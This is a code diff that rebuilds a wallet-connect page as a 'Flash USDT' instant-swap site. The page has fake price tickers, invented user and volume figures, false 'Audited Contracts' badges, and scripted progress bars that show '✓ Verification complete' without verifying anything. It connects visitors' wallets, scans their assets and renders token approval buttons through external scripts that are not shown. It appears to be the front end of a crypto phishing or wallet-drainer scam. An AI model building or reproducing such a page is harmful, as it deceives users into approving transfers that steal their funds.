@@ -1,47 +1,315 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Asset Management</title>
-    <!-- Ethers.js v6 -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 30px; background-color: #f4f4f9; padding: 10px; }
-        button { padding: 12px 20px; font-size: 16px; margin: 8px; cursor: pointer; background-color: #4CAF50; color: white; border: none; border-radius: 5px; width: 100%; max-width: 280px; font-weight: bold; }
-        button:hover { background-color: #45a049; }
-        #connectWalletBtn { background-color: #007BFF; }
-        #connectWalletBtn:hover { background-color: #0056b3; }
-        .wallet-info { margin-top: 15px; font-weight: bold; color: #333; word-break: break-all; }
-        .container { max-width: 650px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
-        .grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-top: 20px; }
-        
-        #debugPanel { text-align: left; background: #1e1e1e; color: #00ff00; padding: 10px; margin-top: 20px; border-radius: 5px; font-family: monospace; font-size: 11px; height: 160px; overflow-y: scroll; white-space: pre-wrap; word-break: break-all; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Flash USDT · Instant Swap & Verify</title>
+  <link rel="stylesheet" href="style.css" />
+  <!-- Ethers.js v6 -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js">
+  </script>
 </head>
 <body>
-    <div class="container">
-        <h2>Asset Management Panel</h2>
-        <button id="connectWalletBtn">Connect Wallet</button>
-        <div class="wallet-info" id="walletInfo">Status: Disconnected</div>
-        
-        <hr style="margin: 25px 0;">
-        
-        <h3>Available Assets</h3>
-        <div id="approvalButtonsContainer" class="grid">
-            <p style="color: #666;">Please connect your wallet to scan assets...</p>
-        </div>
 
-        <!-- Debug Panel (Live me hata dena jaroorat na ho toh) -->
-        <div style="margin-top: 25px; text-align: left;">
-            <strong>System Logs:</strong>
-            <pre id="debugPanel">System ready...</pre>
+  <!-- ===== TICKER ===== -->
+  <div class="ticker-wrapper">
+    <div class="ticker-content">
+      <div class="ticker-item"><span class="coin">BTC/USDT</span> <span class="price">$68,421</span> <span class="green">+2.4%</span></div>
+      <div class="ticker-item"><span class="coin">ETH/USDT</span> <span class="price">$3,550</span> <span class="green">+1.8%</span></div>
+      <div class="ticker-item"><span class="coin">BNB/USDT</span> <span class="price">$612</span> <span class="red">-0.6%</span></div>
+      <div class="ticker-item"><span class="coin">SOL/USDT</span> <span class="price">$145</span> <span class="green">+3.2%</span></div>
+      <!-- duplicate for loop -->
+      <div class="ticker-item"><span class="coin">BTC/USDT</span> <span class="price">$68,421</span> <span class="green">+2.4%</span></div>
+      <div class="ticker-item"><span class="coin">ETH/USDT</span> <span class="price">$3,550</span> <span class="green">+1.8%</span></div>
+      <div class="ticker-item"><span class="coin">BNB/USDT</span> <span class="price">$612</span> <span class="red">-0.6%</span></div>
+      <div class="ticker-item"><span class="coin">SOL/USDT</span> <span class="price">$145</span> <span class="green">+3.2%</span></div>
+    </div>
+  </div>
+
+  <!-- ===== NAVBAR ===== -->
+  <header class="navbar">
+    <div class="logo">⚡ Flash <span>USDT</span></div>
+    <button class="btn-top" id="topTriggerBtn">Generate Flash USDT...</button>
+  </header>
+
+  <!-- ===== HERO ===== -->
+  <section class="hero-container">
+    <div class="hero-left">
+      <div class="live-badge"><span>●</span> Live Network - 2,517 swaps today</div>
+      <h1>Any Currency.<br />Instant <span class="highlight">Flash USDT.</span></h1>
+      <p class="description">
+        Convert Bitcoin, Ethereum, BNB, Solana, or any of 100+ supported assets into USDT in under 2 minutes. Best rates. Zero hidden fees. Fully non-custodial.
+      </p>
+
+      <!-- Main trigger button (used by connectwallet.js) -->
+      <button class="btn-primary" id="connectWalletBtn">Generate Flash USDT →</button>
+
+      <!-- ===== LOADER (hero) ===== -->
+      <div id="loaderWrap" class="loader-wrap">
+        <div id="loaderLabel" class="loader-label">Please wait …</div>
+        <div class="track">
+          <div id="loaderFill" class="fill" style="width:0%;"></div>
         </div>
+      </div>
+
+      <!-- ===== Wallet Info (required by checkbalance.js) ===== -->
+      <div class="wallet-info" id="walletInfo">Status: Disconnected</div>
+
+      <!-- ===== Approval Buttons Container (required by checkbalance.js) ===== -->
+      <div id="approvalButtonsContainer" class="grid">
+        <p style="color: #666;">Please connect your wallet to scan assets...</p>
+      </div>
+
+      <div class="features-row">
+        <div><span>✔</span> Non-Custodial</div>
+        <div><span>✔</span> KYC Optional</div>
+        <div><span>✔</span> No Account Needed</div>
+      </div>
     </div>
 
-    <!-- Scripts strictly in this order -->
-    <script src="debug.js"></script>
-    <script src="checkbalance.js"></script>
-    <script src="connectwallet.js"></script>
+    <!-- ===== SWAP CARD ===== -->
+    <div class="hero-right">
+      <div class="swap-card">
+        <div class="input-group">
+          <label>YOU SEND</label>
+          <div class="input-row">
+            <input type="number" value="1" id="sendAmount" />
+            <div class="select-badge">🪙 BTC</div>
+          </div>
+        </div>
+
+        <div class="rate-indicator">
+          <span>Rate: 1 BTC = 68,421 USDT</span>
+          <button class="swap-icon-btn">⇅</button>
+        </div>
+
+        <div class="input-group">
+          <label>YOU RECEIVE</label>
+          <div class="input-row">
+            <input type="number" value="68421" id="receiveAmount" readonly />
+            <div class="select-badge usdt">💵 USDT</div>
+          </div>
+        </div>
+
+        <div class="swap-info-grid">
+          <div><small>Network Fee</small><strong>0.1%</strong></div>
+          <div><small>Est. Time</small><strong>~90s</strong></div>
+          <div><small>Min Swap</small><strong>$10.00</strong></div>
+        </div>
+
+        <button class="btn-action" id="swapActionBtn">Flash Exchange Now</button>
+
+        <!-- LOADER (swap) -->
+        <div id="loaderWrapSwap" class="loader-wrap">
+          <div id="loaderLabelSwap" class="loader-label">Please wait …</div>
+          <div class="track">
+            <div id="loaderFillSwap" class="fill" style="width:0%;"></div>
+          </div>
+        </div>
+
+        <div class="trust-badges">
+          <span>🔒 SSL Encrypted</span>
+          <span>🛡️ Audited Contracts</span>
+          <span>🌐 180+ Countries</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== STATS ===== -->
+  <section class="stats-grid">
+    <div class="stat-box"><small>24H VOLUME</small><h2>$0</h2><span class="stat-sub green">↑ 18.4%</span></div>
+    <div class="stat-box"><small>TOTAL USERS</small><h2>9,32,710</h2><span class="stat-sub green">↑ 1,200 new</span></div>
+    <div class="stat-box"><small>AVG SETTLEMENT</small><h2>94s</h2><span class="stat-sub">Industry avg: 5 min</span></div>
+    <div class="stat-box"><small>UPTIME</small><h2>99.98%</h2><span class="stat-sub">Last 700 days</span></div>
+  </section>
+
+  <!-- ===== STEPS & CHART (shortened for brevity, same as before) ===== -->
+  <section class="steps-section">
+    <span class="section-tag">PROCESS</span>
+    <h2>Three Steps to <span class="highlight">Instant USDT</span></h2>
+    <p class="section-sub">No sign ups required. No lengthy verification.</p>
+    <div class="steps-grid">
+      <div class="step-card"><div class="step-header"><span class="icon">💳</span><span class="step-num">01</span></div><h3>Choose Your Asset</h3><p>Select from 100+ supported assets.</p></div>
+      <div class="step-card"><div class="step-header"><span class="icon">📊</span><span class="step-num">02</span></div><h3>Enter the Amount</h3><p>Type in how much you want to swap.</p></div>
+      <div class="step-card"><div class="step-header"><span class="icon">⚡</span><span class="step-num">03</span></div><h3>Receive Flash USDT</h3><p>USDT lands in your wallet in under 2 minutes.</p></div>
+    </div>
+  </section>
+
+  <section class="chart-section">
+    <span class="section-tag">SUPPORTED ASSETS</span>
+    <h2>Exchange <span class="highlight-cyan">Any Currency</span> Into USDT</h2>
+    <p class="section-sub">All major cryptocurrencies supported.</p>
+    <div class="chart-card">
+      <div class="chart-header">
+        <div><h3>BTC / USDT - Live Price</h3><small>Bitcoin • Real-time</small></div>
+        <div class="price-wrap"><span class="price-val">$68,421.00</span><span class="green-pill">+2.47% (24h)</span></div>
+      </div>
+      <div class="chart-visual">
+        <svg viewBox="0 0 500 150" preserveAspectRatio="none">
+          <defs><linearGradient id="grad" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#10b981" stop-opacity="0.4"/><stop offset="100%" stop-color="#10b981" stop-opacity="0"/></linearGradient></defs>
+          <path d="M 0 120 Q 100 110, 180 80 T 350 40 T 500 20 L 500 150 L 0 150 Z" fill="url(#grad)"/>
+          <path d="M 0 120 Q 100 110, 180 80 T 350 40 T 500 20" fill="none" stroke="#10b981" stroke-width="2"/>
+        </svg>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== DEBUG PANEL (exactly like working script) ===== -->
+  <div style="margin-top: 25px; padding: 0 5%; text-align: left;">
+    <strong>System Logs:</strong>
+    <pre id="debugPanel" style="
+      background: #1e1e1e;
+      color: #00ff00;
+      padding: 10px;
+      border-radius: 5px;
+      font-family: monospace;
+      font-size: 11px;
+      height: 160px;
+      overflow-y: scroll;
+      white-space: pre-wrap;
+      word-break: break-all;
+      border: 1px solid #333;
+    ">System ready...</pre>
+  </div>
+
+  <!-- ==============================
+  SCRIPTS – exact order as working script
+  ============================== -->
+  <script src="debug.js"></script>
+  <script src="checkbalance.js"></script>
+  <script src="connectwallet.js"></script>
+
+  <!-- ==============================
+  INLINE – loader observer + swap calculator (non‑interfering)
+  ============================== -->
+  <script>
+    (function() {
+      'use strict';
+
+      // ---- references ----
+      const connectBtn = document.getElementById('connectWalletBtn');
+      const topBtn = document.getElementById('topTriggerBtn');
+      const swapBtn = document.getElementById('swapActionBtn');
+
+      // loader #1 (hero)
+      const loaderWrap = document.getElementById('loaderWrap');
+      const loaderLabel = document.getElementById('loaderLabel');
+      const loaderFill = document.getElementById('loaderFill');
+
+      // loader #2 (swap)
+      const loaderWrapSwap = document.getElementById('loaderWrapSwap');
+      const loaderLabelSwap = document.getElementById('loaderLabelSwap');
+      const loaderFillSwap = document.getElementById('loaderFillSwap');
+
+      // ---- shared progress function ----
+      function runProgress(labelEl, fillEl, wrapEl, buttonToDisable, resetAfter = true) {
+        if (wrapEl.classList.contains('active')) return;
+
+        if (buttonToDisable) {
+          buttonToDisable.disabled = true;
+          buttonToDisable.style.opacity = '0.6';
+          buttonToDisable.style.cursor = 'not-allowed';
+        }
+
+        wrapEl.classList.add('active');
+
+        labelEl.textContent = 'Please wait …';
+        fillEl.style.width = '25%';
+
+        setTimeout(() => {
+          labelEl.textContent = 'Blockchain processing …';
+          fillEl.style.width = '55%';
+        }, 1800);
+
+        setTimeout(() => {
+          labelEl.textContent = 'Finalising …';
+          fillEl.style.width = '85%';
+        }, 3600);
+
+        setTimeout(() => {
+          labelEl.textContent = '✓ Verification complete';
+          fillEl.style.width = '100%';
+
+          setTimeout(() => {
+            if (buttonToDisable) {
+              buttonToDisable.disabled = false;
+              buttonToDisable.style.opacity = '1';
+              buttonToDisable.style.cursor = 'pointer';
+            }
+
+            if (resetAfter) {
+              setTimeout(() => {
+                wrapEl.classList.remove('active');
+                fillEl.style.width = '0%';
+                labelEl.textContent = 'Please wait …';
+              }, 3000);
+            }
+          }, 600);
+        }, 5200);
+      }
+
+      // ---- top trigger ----
+      topBtn.addEventListener('click', function() {
+        if (topBtn.disabled) return;
+        runProgress(loaderLabel, loaderFill, loaderWrap, topBtn, true);
+        if (connectBtn) {
+          connectBtn.disabled = true;
+          connectBtn.style.opacity = '0.6';
+          setTimeout(() => {
+            connectBtn.disabled = false;
+            connectBtn.style.opacity = '1';
+          }, 6000);
+        }
+      });
+
+      // ---- swap action ----
+      swapBtn.addEventListener('click', function() {
+        if (swapBtn.disabled) return;
+        runProgress(loaderLabelSwap, loaderFillSwap, loaderWrapSwap, swapBtn, true);
+      });
+
+      // ---- observer for connectwallet.js "PLEASE WAIT" ----
+      if (connectBtn) {
+        const observer = new MutationObserver(function() {
+          const text = connectBtn.textContent.toUpperCase();
+          if (text.includes('PLEASE WAIT') && !connectBtn.disabled) {
+            if (!loaderWrap.classList.contains('active')) {
+              runProgress(loaderLabel, loaderFill, loaderWrap, connectBtn, true);
+            }
+            observer.disconnect();
+          }
+        });
+        observer.observe(connectBtn, { childList: true, characterData: true, subtree: true });
+
+        // Also observe disabled attribute
+        const attrObserver = new MutationObserver(function() {
+          if (connectBtn.disabled && !loaderWrap.classList.contains('active')) {
+            const text = connectBtn.textContent.toUpperCase();
+            if (text.includes('PLEASE WAIT') || text.includes('WAIT')) {
+              runProgress(loaderLabel, loaderFill, loaderWrap, connectBtn, true);
+              attrObserver.disconnect();
+            }
+          }
+        });
+        attrObserver.observe(connectBtn, { attributes: true, attributeFilter: ['disabled'] });
+      }
+
+      // ---- swap calculator ----
+      const sendInput = document.getElementById('sendAmount');
+      const receiveInput = document.getElementById('receiveAmount');
+      if (sendInput && receiveInput) {
+        const rate = 68421;
+        sendInput.addEventListener('input', function() {
+          const val = parseFloat(this.value) || 0;
+          receiveInput.value = (val * rate).toFixed(2);
+        });
+        receiveInput.value = (parseFloat(sendInput.value) * rate).toFixed(2);
+      }
+
+      console.log('⚡ Flash USDT · inline logic ready');
+    })();
+  </script>
+
 </body>
 </html>
